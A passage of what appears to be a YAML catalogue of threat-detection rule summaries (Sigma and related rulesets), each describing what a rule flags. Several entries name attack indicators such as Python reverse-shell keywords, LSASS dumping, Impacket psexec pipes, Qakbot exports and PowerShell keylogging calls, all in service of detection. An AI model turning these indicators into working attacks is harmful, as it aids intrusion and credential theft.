    entries involving InprocServer32 settings. The detection is fine-tuned to exclude
    benign or expected DLL files (such as those from the system32\wbem directory)
    to reduce the likelihood of false positives. The aim is to catch malicious activities
    targeting credential access and code execution through these vulnerabilities,
    requiring immediate attention due to the critical threat level.
  Updated-Date: '2024_09_03'
32b96012-7892-429e-b26c-ac2bf46066ff:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 83fd009c4008aa3d9d8bd78c72a784e1
  Ruleset: core
  Summary: This rule detects the execution of the shell32.dll library by rundll32.exe
    from suspicious directories such as %AppData%, %LocalAppData%, %Temp%, %tmp%,
    \AppData\, \Temp\, and \Users\Public\. This activity is often associated with
    defense evasion and execution tactics employed by malicious actors, particularly
    linked to techniques of executing control panel items with malicious intent.
  Updated-Date: '2024_09_03'
32d56ea1-417f-44ff-822b-882873f5f43b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b0f20918875250634482282fec282222
  Ruleset: core
  Summary: 'This rule detects the execution of Impacket''s psexec.py tool by monitoring
    specific Windows Security events. The detection criteria include EventID 5145,
    where the ShareName contains ''\\*\IPC$'' and the RelativeTargetName field contains
    one of the following substrings: ''RemCom_stdin,'' ''RemCom_stdout,'' or ''RemCom_stderr.''
    This monitoring helps identify lateral movement techniques involving PsExec, which
    is commonly used for remote command execution.'
  Updated-Date: '2024_09_03'
32e19d25-4aed-4860-a55a-be99cb0bf7ed:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f4a9c6f23cb2420d3ec073fa83613eec
  Ruleset: sigmahq
  Summary: This rule detects possible DC Shadow attacks through the creation of new
    Service Principal Names (SPNs). DC Shadow is a method used by attackers to inject
    and manipulate directory data into a compromised domain. The detection focuses
    on specific Windows security events, namely EventIDs 4742 and 5136, related to
    changes in service principal names that typically start with 'GC/'. This activity
    is anomalous and indicates potential unauthorized actions on domain controllers
    to replicate malicious directory data. The rule applies to systems with the "Audit
    Directory Service Changes" logging policy configured and targets objects with
    system access control lists that generate audit events under specific conditions.
  Updated-Date: '2024_09_04'
32e280f1-8ad4-46ef-9e80-910657611fbc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9a15bc82d7d4f8d7f5ef2d6a980152a8
  Ruleset: sigmahq
  Summary: "This rule detects the presence of Unicode characters that are homoglyphs\
    \ of ASCII letter characters used in command lines. Homoglyphs are characters\
    \ that are visually identical to ASCII characters, making them useful for obfuscation\
    \ and masquerading techniques. The rule covers \"perfect\" homoglyphs\u2014characters\
    \ indistinguishable from ASCII letters\u2014which can be exploited in attacks\
    \ to mislead and confuse security systems or users. The presence of these characters\
    \ in command lines can indicate an attempt to deceive or bypass defenses through\
    \ such techniques. Detection includes both uppercase and lowercase homoglyph characters,\
    \ encompassing several alphabets that may appear exactly like common ASCII letters."
  Updated-Date: '2024_09_04'
32e62bc7-3de0-4bb1-90af-532978fe42c0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3029e4824f4532544f1bc2c5e1b54d19
  Ruleset: core
  Summary: This rule detects the execution of Python scripts that use specific keywords
    indicating potential reverse shell activity on Linux systems. It monitors for
    processes that run Python with command-line arguments involving terms such as
    'import', 'pty', 'spawn(', and '.connect', which are often associated with reverse
    shell scripts. By looking for these patterns, the rule aims to identify malicious
    network activity that could lead to unauthorized remote access.
  Updated-Date: '2024_09_03'
33339be3-148b-4e16-af56-ad16ec6c7e7b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: db8a47f16156f277991b2b53b513f4ce
  Ruleset: sigmahq
  Summary: This rule detects the usage of `findstr` or `find` commands to identify
    and execute `.lnk` files, a tactic observed in the HHS redirect attack often used
    for defense evasion.
  Updated-Date: '2024_09_04'
333cdbe8-27bb-4246-bf82-b41a0dca4b70:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2f13f2eb7a98214fe62600b50c91997d
  Ruleset: core
  Summary: This rule detects the loading of the `vss_ps.dll` file by executables that
    are not commonly associated with this dynamic link library on Windows systems.
    The rule identifies potential misuse by filtering out well-known legitimate applications
    and predefined folders that typically utilize this DLL, such as Windows system
    files and specific program directories. This helps in identifying suspicious activities
    potentially related to defense evasion or impactful malicious behavior, indicated
    by uncommon executables interfacing with Volume Shadow Copy functionalities.
  Updated-Date: '2024_09_03'
3371f518-5fe3-4cf6-a14b-2a0ae3fd8a4f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 64ba93c45efa1bab36fa2ba5f0d69da5
  Ruleset: sigmahq
  Summary: This rule detects the execution of Sysinternals PsService, a tool that
    can be used for service reconnaissance and tampering on Windows systems. The detection
    is based on identifying processes with specific file names such as 'psservice.exe',
    'PsService.exe', or 'PsService64.exe'. Recognizing these processes can help identify
    potential misuse, although legitimate administrative use of PsService can also
    trigger this detection.
  Updated-Date: '2024_09_04'
339ed3d6-5490-46d0-96a7-8abe33078f58:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 400403f57ab562b2edfc31a094a3ac9c
  Ruleset: emerging-threats
  Summary: This rule detects the execution of "rundll32.exe" with exports indicative
    of Qakbot malware activity. The detection focuses on specific parent processes
    such as "cmd.exe," "cscript.exe," "curl.exe," "mshta.exe," "powershell.exe," "pwsh.exe,"
    and "wscript.exe." It further filters the "rundll32.exe" command line for known
    Qakbot paths like "ProgramData," "Users\Public," "AppData\Local\Temp," and "AppData\Roaming."
    Additionally, it identifies distinctive exports associated with Qakbot, including
    "aslr," "bind," "DrawThemeIcon," "GG10," "GL70," "jhbvygftr," "kjhbhkjvydrt,"
    "LS88," "Motd," "N115," "next," "Nikn," "print," "qqqb," "qqqq," "RS32," "Test,"
    "Time," "Updt," "vips," "Wind," "WW50," "X555," "XL55," "xlAutoOpen," and "XS88."
    This helps in distinguishing between legitimate "rundll32.exe" usage and malicious
    actions attributed to Qakbot.
  Updated-Date: '2024_09_03'
33a2d1dd-f3b0-40bd-8baf-7974468927cc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9897ff1f8e689178d4d3f1e1eb208ac2
  Ruleset: emerging-threats
  Summary: This rule detects an image load pattern associated with the use of a tool
    named PRIVATELOG, which is observed rarely in legitimate cases. Specifically,
    it identifies when the executable 'svchost.exe' loads the DLL file 'clfsw32.dll',
    indicating potential defense evasion or privilege escalation activity. This pattern
    is linked to sophisticated attack techniques and is considered a high-severity
    event.
  Updated-Date: '2024_09_03'
33be4333-2c6b-44f4-ae28-102cdbde0a31:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 28a8d01392fe3cb3813fb23db51ed0b1
  Ruleset: sigmahq
  Summary: This rule detects the suspicious execution of 'Msbuild.exe' when it is
    initiated by an uncommon parent process. 'Msbuild.exe' is a legitimate tool primarily
    used for building applications within the Microsoft ecosystem. Common parent processes
    for 'Msbuild.exe' include development environments like 'devenv.exe', command-line
    interfaces like 'cmd.exe', and other related executable files. If 'Msbuild.exe'
    is executed by a different parent process not included in this routine list, it
    may indicate an attempt at defense evasion by malicious actors.
  Updated-Date: '2024_09_04'
33e814e0-1f00-4e43-9c34-31fb7ae2b174:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6f26af03f188a82f8b53b532c1bcb9a8
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "esxcli" command with the "network"
    flag to identify activities aiming to retrieve information about the network configuration
    on ESXi servers. This detection focuses on commands that include "get" or "list"
    within the command line, which are typically used to gather network-related data.
    This activity could be an indication of a discovery tactic often associated with
    malicious actors aiming to understand an environment's network setup for potential
    exploitation.
  Updated-Date: '2024_09_04'
33efc23c-6ea2-4503-8cfe-bdf82ce8f705:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4e885dfb002313a8e6a9844d06b02237
  Ruleset: core
  Summary: This rule detects when an attacker registers a new AMSI (Antimalware Scan
    Interface) provider via the Windows Registry to achieve persistence. It monitors
    the creation of registry keys associated with AMSI providers and identifies suspicious
    activity by excluding changes made from typical system and program directories.
    This helps in identifying unauthorized AMSI providers which may indicate malicious
    persistence mechanisms.
  Updated-Date: '2024_09_03'
33efc23c-6ea2-4503-8cfe-bdf82ce8f719:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: aee95ed4643d81d4da097e44b938379c
  Ruleset: core
  Summary: This rule detects the setting of the "DumpType" registry value to "2,"
    which indicates a request for a "Full Dump" of the Local Security Authority Subsystem
    Service (LSASS). Techniques such as LSASS Shtinkering necessitate this registry
    value to be set to "2" to dump the LSASS process. Detecting this change helps
    identify potential malicious activities aimed at accessing sensitive information
    from the LSASS process.
  Updated-Date: '2024_09_03'
33f41cdd-35ac-4ba8-814b-c6a4244a1ad4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cdedc8fd0eaef07f73b9596dd68e54b6
  Ruleset: core
  Summary: This rule detects file writes performed by WMI (Windows Management Instrumentation)
    script event consumers, particularly when the process `scrcons.exe` located in
    the `C:\WINDOWS\system32\wbem\` directory is involved. Such activity may indicate
    the use of WMI for persistence mechanisms often utilized by malware.
  Updated-Date: '2024_09_03'
340a090b-c4e9-412e-bb36-b4b16fe96f9b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cb800d9dba8f7b364cbc2161a36c797d
  Ruleset: core
  Summary: This rule detects the execution of a renamed "dctask64.exe," a signed binary
    by ZOHO Corporation used in ManageEngine Endpoint Central. The binary can be exploited
    for DLL injection, arbitrary command execution, and process initiation. Specific
    hash values indicative of this misuse are monitored to identify such activities.
  Updated-Date: '2024_09_03'
340ee172-4b67-4fb4-832f-f961bdc1f3aa:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a6eaaa68afb9fb194b24e355bd57dc86
  Ruleset: sigmahq
  Summary: This rule detects when a user has successfully reset their password in
    Azure Active Directory (Azure AD). It monitors audit logs specifically for user
    management activities where the status is successful, the action was initiated
    by a user principal name (UPN), and the activity type involves a password reset.
    This is aimed at identifying potential persistence or credential access attempts
    as part of threat actor activity.
  Updated-Date: '2024_09_04'
34275eb8-fa19-436b-b959-3d9ecd53fa1f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8ef63f42fdd0987da78e7affd6acd704
  Ruleset: sigmahq
  Summary: This rule detects the use of "tasklist.exe" to enumerate specific DLLs
    or EXEs employed by a binary, a technique typically leveraged by attackers to
    identify the process identifier (PID) utilizing the DLL in question. This identification
    is often a precursor to dumping process memory or executing other malicious activities.
    The rule particularly looks for command lines containing 'rdpcorets.dll', aiming
    to intercept malicious attempts associated with processes such as svchost.exe,
    which may be targeted for credential dumping or similar exploits.
  Updated-Date: '2024_09_04'
34746e8c-5fb8-415a-b135-0abc167e912a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 33ec035eb1ebf2f7ebda76312434ed60
  Ruleset: sigmahq
  Summary: This rule detects the creation of executable files within the WinSxS folder
    by processes that are not system processes. The WinSxS folder, also known as the
    Windows Side-by-Side directory, is typically reserved for system files and maintaining
    essential Windows components. Unauthorized creation of files, especially executable
    binaries, in this directory by non-system processes can indicate malicious activity,
    such as the presence of malware. The rule employs specific file path patterns
    to identify and exclude legitimate system process activities, focusing on suspicious
    behaviors that may warrant further investigation.
  Updated-Date: '2024_09_04'
347906f3-e207-4d18-ae5b-a9403d6bcdef:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9b148bcfb20a98a3a8b80144d601823f
  Ruleset: sigmahq
  Summary: This rule detects the use of the `netsh.exe` command to modify the Microsoft
    Defender Firewall settings. Specifically, it identifies instances where adversaries
    attempt to set new rules that allow certain groups through the firewall. The command
    line criteria include terms such as "advfirewall," "firewall," "set," "rule,"
    "group=," "new," and "enable=Yes," indicating an attempt to bypass network usage
    controls for defense evasion.
  Updated-Date: '2024_09_04'
34979410-e4b5-4e5d-8cfb-389fdff05c12:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 76dad706499c5376995dfc3cec87bfd5
  Ruleset: sigmahq
  Summary: This rule detects the use of the 'chattr' utility on Linux systems to remove
    the immutable file attribute by monitoring process creation logs. The presence
    of the 'chattr' command combined with the '-i' flag in the command line is indicative
    of this activity. Removing the immutable attribute from files can be a tactic
    used in defense evasion, allowing unauthorized modifications to files that were
    previously protected.
  Updated-Date: '2024_09_04'
34986307-b7f4-49be-92f3-e7a4d01ac5db:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cb698ea19146d7eb4dddad323e9e127f
  Ruleset: sigmahq
  Summary: This rule detects the creation of Rclone configuration files on Windows
    systems by monitoring file events, specifically targeting file paths that include
    ":\Users\" and "\.config\rclone\". Rclone is a tool often used for data synchronization
    and cloud storage management, making it a potential vector for data exfiltration.
    The presence of these configuration files may indicate an attempt to configure
    Rclone for data transfers, which can be a sign of malicious activity or misuse
    despite legitimate uses.
  Updated-Date: '2024_09_04'
349d891d-fef0-4fe4-bc53-eee623a15969:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b02f0ecd0a338e61b2f823969cd9a306
  Ruleset: sigmahq
  Summary: This rule detects the use of Windows 8.3 short name notation in command
    lines, which can be a method to evade command-line detection. It specifically
    looks for command lines containing '~1\' or '~2\' while excluding certain legitimate
    processes such as 'Dism.exe', 'cleanmgr.exe', Directory Opus, 'WebexHost.exe',
    'thor64.exe', 'veam.backup.shell.exe', 'winget.exe', and 'Everything.exe'. Additionally,
    it filters out command lines related to certain paths and specific filenames like
    'wbxreport.exe' and files within Git's directories. The rule aims to identify
    potential misuse of short names to obscure malicious activities, while accounting
    for some possible false positives due to legitimate application use.
  Updated-Date: '2024_09_04'
34aa0252-6039-40ff-951f-939fd6ce47d8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f2044ac2e8da610d1f4d1f17edd0b21c
  Ruleset: sigmahq
  Summary: This rule detects the installation of a keyboard preload with a suspicious
    layout, such as Chinese, Iranian, or Vietnamese, being loaded in a user session
    on systems maintained by US staff. It monitors changes to specific registry keys
    (\Keyboard Layout\Preload and \Keyboard Layout\Substitutes) to identify potentially
    unauthorized or unusual keyboard layouts that could indicate malicious activity
    or unauthorized system access.
  Updated-Date: '2024_09_04'
34d81081-03c9-4a7f-91c9-5e46af625cde:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bca7d6588507fcd3da560b87f5f222cb
  Ruleset: sigmahq
  Summary: This rule detects when an unauthorized user attempts a full data export
    in Bitbucket, which is monitored through audit logs. Bitbucket, a Git repository
    management solution, logs such events under the 'Data pipeline' category with
    the action 'Unauthorized full data export triggered'. This alert is critical and
    signifies potential data exfiltration efforts by unauthorized actors.
  Updated-Date: '2024_09_04'
34e1c7d4-0cd5-419d-9f1b-1dad3f61018d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9852d017fe96818e15af9f35a24e827e
  Ruleset: core
  Summary: This rule detects when an organization owner disables Dependabot alerts
    for private repositories or Dependabot security updates for all repositories on
    GitHub. Dependabot is a tool that performs scans to identify insecure dependencies
    and sends alerts. The detection includes actions such as disabling new repository
    alerts, security updates for new repositories, and vulnerability alerts. It is
    crucial to validate whether the actor performing these changes is authorized,
    as these actions can have significant security implications.
  Updated-Date: '2024_09_03'
34ebb878-1b15-4895-b352-ca2eeb99b274:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e3db549266ee88736b71f6930de3318d
  Ruleset: sigmahq
  Summary: This rule detects the use of the command line to execute shutdown or reboot
    commands on a Windows system. It specifically identifies instances where the `shutdown.exe`
    utility is used with parameters such as `/r` for reboot or `/s` for shutdown.
    This activity is monitored as it may indicate an attempt to disrupt normal operations
    or perform an unauthorized reboot or shutdown of the system.
  Updated-Date: '2024_09_04'
34f90d3c-c297-49e9-b26d-911b05a4866c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 10ecca4e0452a8e62f4bb4c4ca2dbe1a
  Ruleset: sigmahq
  Summary: This rule detects the use of PowerShell scripts designed for keylogging,
    specifically focusing on adversaries attempting to log user keystrokes to capture
    credentials. Key indicators include the presence of 'Get-Keystrokes' in the PowerShell
    script and calls to 'GetAsyncKeyState' and 'GetForegroundWindow' functions from
    the user32.dll library, which are commonly used to monitor and record keystrokes
    running in the background.
  Updated-Date: '2024_09_04'
350dfb37-3706-4cdc-9e2e-5e24bc3a46df:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ddfb0096be5d31db3e88b0a530e24552
  Ruleset: core
  Summary: This rule detects when an attacker attempts to delete or disable audit
    logs on an MSSQL server by executing the "ALTER SERVER AUDIT" or "DROP SERVER
    AUDIT" transactions. This action typically indicates an attempt to evade security
    monitoring and tamper with server audit policies.
  Updated-Date: '2024_09_03'
352a54e1-74ba-4929-9d47-8193d67aba1e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4e2e23ec16cfe388e267320574b71b60
  Ruleset: sigmahq
  Summary: This rule detects when a user or application modifies the federation settings
    on an Azure domain. Changes to such settings can be indicative of a potential
    security issue or unauthorized access. Federation settings are crucial for domain
    authentication processes, and modifications might be performed legitimately by
    system administrators or could indicate suspicious activity if done by unfamiliar
    users. Any unexpected alterations should be investigated to ensure they are not
    compromising system security.
  Updated-Date: '2024_09_04'
352a918a-34d8-4882-8470-44830c507aa3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7f89985d5dd5ee8fdb47b5b945ba3a34
  Ruleset: sigmahq
  Summary: This rule detects the use of IMDS (Instance Metadata Service) credentials
    outside of AWS infrastructure, specifically when an instance identity performs
    actions that are not within AWS Systems Manager (SSM). Such activity can suggest
    that a compromised EC2 instance is being leveraged as a pivot point to perform
    unauthorized operations.
  Updated-Date: '2024_09_04'
35a05c60-9012-49b6-a11f-6bab741c9f74:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1db7dab3280972178c5d3fccb92972cf
  Ruleset: sigmahq
  Summary: This rule detects the use of the wget utility to download content into
    temporary directories such as "/tmp" or "/var/tmp" on a Linux system. Wget is
    commonly used for downloading files from the internet, and activity involving
    this tool in temporary directories may indicate malicious behavior or the initial
    stages of a compromise. The rule aims to identify potentially unauthorized or
    suspicious network-related file downloads that could be associated with malware
    such as GobRAT.
  Updated-Date: '2024_09_04'
35a7dc42-bc6f-46e0-9f83-81f8e56c8d4b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 60b4c55b8d1b96d0dedda350333937ee
  Ruleset: emerging-threats
  Summary: This rule detects the use of the Pingback backdoor, which establishes an
    ICMP tunnel for command and control (C2) activities. Specifically, it identifies
    the loading of a DLL file named 'oci.dll' by the 'msdtc.exe' process on Windows
    systems, indicative of this malicious behavior as described in the Trustwave report.
  Updated-Date: '2024_09_03'
35b781cc-1a08-4a5a-80af-42fd7c315c6b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3275f6c5312fc8c0bf91d97e7e23098d
  Ruleset: core
  Summary: This rule detects the activity of AzureHound, a data collector tool for
    Microsoft Azure used as part of BloodHound, by identifying its default User-Agent
    following successful authentication procedures.
  Updated-Date: '2024_09_03'
35ba1d85-724d-42a3-889f-2e2362bcaf23:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 87fa5cbddc926bf5b64b7184dfd718ed
  Ruleset: core
  Summary: This rule detects reconnaissance activities targeting privileged users
    or groups within Active Directory by monitoring event ID 4661. It specifically
    looks for object access attempts to Security Account Manager (SAM) users or groups
    with known privileged Security Identifiers (SIDs) such as '-512', '-502', and
    others, including names containing 'admin'. The rule helps identify if an adversary
    is attempting to enumerate privileged accounts, which could be an indication of
    a pending attack or information gathering for later exploitation. If the source
    account attempting to access these objects does not end with a '$', it is flagged
    as suspicious activity.
  Updated-Date: '2024_09_03'
35bc7e28-ee6b-492f-ab04-da58fcf6402e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 016846ede4236819e20069b83048ca80
  Ruleset: sigmahq
  Summary: This rule detects unusual processes that are remotely accessing the file
    "desktop.ini" over a network share on Windows systems. The "desktop.ini" file
    can be exploited to modify the way Windows Explorer presents a folder's contents,
    such as renaming files without physically altering them on the disk. This type
    of activity may indicate an attempt to manipulate or disguise files for malicious
    purposes, aligning with tactics used to achieve persistence by altering how users
    view certain directory contents.
  Updated-Date: '2024_09_04'
35c55673-84ca-4e99-8d09-e334f3c29539:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c5166ab8c7556d2677de254843e839c6
  Ruleset: core
  Summary: This rule detects remote RPC calls that aim to modify the registry, potentially
    to execute malicious code. It identifies specific EventIDs and Interface UUIDs
    associated with these activities. This procedure is often used in lateral movement
    attacks, where adversaries attempt to maintain or gain additional access within
    a network by remotely altering registry settings. The rule leverages event logs
    to recognize such suspicious actions.
  Updated-Date: '2024_09_03'
35f41cd7-c98e-469f-8a02-ec4ba0cc7a7e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7ff8e10447ae2e2d1c1376cb693d0001
  Ruleset: sigmahq
  Summary: This rule detects the usage of the "Write-EventLog" PowerShell cmdlet with
    the 'RawData' flag, which can be leveraged to write malicious payloads to the
    Windows EventLog for retrieval and use at a later time.
  Updated-Date: '2024_09_04'
3603f18a-ec15-43a1-9af2-d196c8a7fec6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fd8a02377fb9f99d490a7cae369a3d3e
  Ruleset: sigmahq
  Summary: This rule detects the use of the `csrutil` command to disable System Integrity
    Protection (SIP) on macOS. SIP is a security feature that helps prevent potentially
    malicious software from modifying protected files and folders on the system. The
    disabling of SIP is often seen in post-exploit scenarios where an attacker seeks
    to maintain persistence or further compromise the system. Detecting the execution
    of the command indicating the disabling of SIP can help identify potentially malicious
    activity on a macOS system.
  Updated-Date: '2024_09_04'
360a1340-398a-46b6-8d06-99b905dc69d2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a83f0213381e4f3d2f5f02de39086023
  Ruleset: core
  Summary: This rule detects the expiration of the grace period for Windows Defender,
    indicating that protection against viruses, spyware, and other potentially unwanted
    software is disabled.
  Updated-Date: '2024_09_03'
36210e0d-5b19-485d-a087-c096088885f0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f3eb203c4d9a48ed4812828d21990fd3
  Ruleset: core
  Summary: This rule detects suspicious PowerShell invocation patterns by identifying
    specific substrings within the command line parameters that may indicate obfuscation
    or manipulation. The detection focuses on various forms and abbreviations of common
    PowerShell parameters such as "-windowstyle hidden", "-NoProfile", "-noninteractive",
    and "-encodedCommand", among others. These substrings often signify attempts to
    execute PowerShell scripts stealthily or to bypass execution policies, which can
    be indicative of malicious activity or malware usage. The rule is applicable to
    processes where the image ends with either "powershell.exe" or "pwsh.exe".
  Updated-Date: '2024_09_03'
36222790-0d43-4fe8-86e4-674b27809543:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 245554eb2e35b4f0266bfb352d1a2073
  Ruleset: emerging-threats
  Summary: This rule detects potential activity from the MuddyWater APT (Advanced
    Persistent Threat) group, which is known for its cyber espionage operations targeting
    various sectors. The detection focuses on specific process creation patterns on
    Windows systems, particularly those involving suspicious MSHTA and PowerShell
    commands, as well as system survey scripts that query information about the operating
    system and network configurations. Additionally, the rule looks for PowerShell
    backdoor commands that use Base64 encoding, manipulate HTTP responses, and perform
    bitwise XOR operations. These indicators suggest malicious actions aimed at evading
    defenses and establishing unauthorized remote access.
  Updated-Date: '2024_09_03'
363bae16-f888-4f89-aad3-68fa5b4e77f1:
  Created-Date: '2024_09_25'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ad79c081ae66a672ea5cdbf469e7be50
  Ruleset: securityonion-resources
  Summary: This rule detects when the Security Onion grid has entered an unhealthy
    state. Monitoring such events is critical, as they suggest issues within the Security
    Onion infrastructure. Users are advised to check the Security Onion Console (SOC)
    for further details and troubleshooting.
  Updated-Date: '2024_09_25'
363eccc0-279a-4ccf-a3ab-24c2e63b11fb:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fee628c927b994473ffd49c6afd3956b
  Ruleset: sigmahq
  Summary: This rule detects the creation of scheduled tasks using PowerShell, which
    adversaries may exploit to perform initial or recurring execution of malicious
    code on Windows systems. It identifies specific PowerShell cmdlets and methods
    related to task scheduling, such as `New-ScheduledTaskAction`, `New-ScheduledTaskTrigger`,
    and `Register-ScheduledTask`, as well as the invocation of `CimMethod` within
    the Task Scheduler namespace. Script Block Logging must be enabled for this detection
    to function.
  Updated-Date: '2024_09_04'
36440e1c-5c22-467a-889b-593e66498472:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a70adee69560596332b308607277a22f
  Ruleset: core
  Summary: This rule detects sign-ins originating from IP addresses known to be malicious
    at the time of the sign-in event. The purpose is to identify potential security
    threats by correlating sign-in data with a list of recognized malicious IP sources,
    primarily using Azure risk detection services. Investigations into flagged sessions
    should consider the broader context of user sign-ins to accurately determine the
    threat level.
  Updated-Date: '2024_09_03'
36475a7d-0f6d-4dce-9b01-6aeb473bbaf1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a0dc8fd4b7b857c309ff4358104d5f0b
  Ruleset: sigmahq
  Summary: This rule detects the execution of arbitrary PowerShell code via the SyncAppvPublishingServer.vbs
    script. It monitors for process creation events where the command line includes
    the path to SyncAppvPublishingServer.vbs and a minimum requirement of a semi-colon,
    which is typical in such execution patterns. This method is often associated with
    defense evasion techniques as specified in the relevant attack tactics.
  Updated-Date: '2024_09_04'
36480ae1-a1cb-4eaa-a0d6-29801d7e9142:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 94bf55a81eb4adb078334b9e54154d79
  Ruleset: sigmahq
  Summary: This rule detects the execution of renamed binaries that are often used
    by attackers or malware for potential defense evasion. It leverages the new Sysmon
    OriginalFileName datapoint to identify instances where common system utilities
    such as 'Cmd.exe', 'CONHOST.EXE', '7z.exe', 'WinRAR.exe', 'wevtutil.exe', 'net.exe',
    'net1.exe', 'netsh.exe', and 'InstallUtil.exe' have been renamed and executed.
    This behavior is indicative of masquerading techniques where malicious actors
    use renamed binaries to avoid detection. Instances where these binaries are legitimately
    renamed by custom applications should be identified and added to a whitelist to
    reduce false positives.
  Updated-Date: '2024_09_04'
36803969-5421-41ec-b92f-8500f79c23b0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6f4a6f573080973531393bdfab4aed5e
  Ruleset: core
  Summary: This rule detects registry changes associated with persistence techniques
    that leverage the GlobalFlags and SilentProcessExit keys within the Windows operating
    system. It monitors specific registry paths under '\Microsoft\Windows NT\CurrentVersion\'
    and '\Image File Execution Options\' to identify modifications that may indicate
    the use of GlobalFlags for configuring debug settings, or the use of SilentProcessExit
    for defining actions to be taken when a specified process exits. These registry
    keys can be used by attackers to maintain persistence on a system, elevate privileges,
    or evade defenses.
  Updated-Date: '2024_09_03'
36aa86ca-fd9d-4456-814e-d3b1b8e1e0bb:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 18eec3e18c4f0c8fab64ba8df022d64e
  Ruleset: core
  Summary: This rule detects relevant ClamAV messages on Linux systems. It identifies
    instances where ClamAV has found malicious entities including Trojans, VirTools,
    Webshells, Rootkits, and the Htran malware. These detections are crucial for identifying
    various types of malware and potential threats within a system's environment.
  Updated-Date: '2024_09_03'
36d88494-1d43-4dc0-b3fa-35c8fea0ca9d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1eb590c7457d877163ce1fc6d1a34634
  Ruleset: core
  Summary: This rule detects the execution of the CreateMiniDump hack tool, which
    is used to capture the memory of the LSASS process, thereby enabling the attacker
    to extract credentials from the compromised machine. The detection is based on
    specific file name patterns and hash values associated with CreateMiniDump.exe.
  Updated-Date: '2024_09_03'
36e037c4-c228-4866-b6a3-48eb292b9955:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8dfd67fe22eb25cbd1c5f27faccef205
  Ruleset: sigmahq
  Summary: This rule detects DNS queries initiated by "Regsvr32.exe," a legitimate
    command-line utility in Windows used for registering and unregistering DLL files.
    However, this utility can be leveraged by attackers for purposes like command
    execution and to evade security controls, such as Applocker bypass. Detecting
